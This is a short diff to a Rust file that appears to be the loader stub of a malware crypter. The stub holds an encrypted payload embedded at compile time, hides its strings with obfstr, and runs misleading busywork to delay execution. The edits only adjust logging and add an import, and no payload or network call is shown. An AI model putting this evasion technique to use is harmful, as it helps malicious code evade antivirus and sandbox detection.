@@ -10,6 +10,7 @@ use aes_gcm::{
 use std::convert::TryInto;
 use busywork::{BusyWork, Categories, Intensity};
 use obfstr::obfstr;
+use rand::Rng;
 
 
 // Embedded at compile time by the crypter.
@@ -65,7 +66,7 @@ fn behavior_misleading(duration_secs: u64) {
 fn delay_execution() {
     if DELAY_SECS > 0 {
         if VERBOSE {
-            logger::log_info(&format!(obfstr!("Delaying execution by {} seconds..."), DELAY_SECS));
+            logger::log_info(&format!("{} {} seconds...", obfstr!("Delaying execution by"), DELAY_SECS));
         }
         behavior_misleading(DELAY_SECS);
     }
@@ -106,7 +107,7 @@ fn run() -> Result<(), Box<dyn Error>> {
 fn main() {
     if let Err(error) = run() {
         if VERBOSE {
-            logger::log_error(obfstr!(&format!("Error: {error}")));
+            logger::log_error((&format!("Error: {error}")));
         }
         std::process::exit(1);
     }
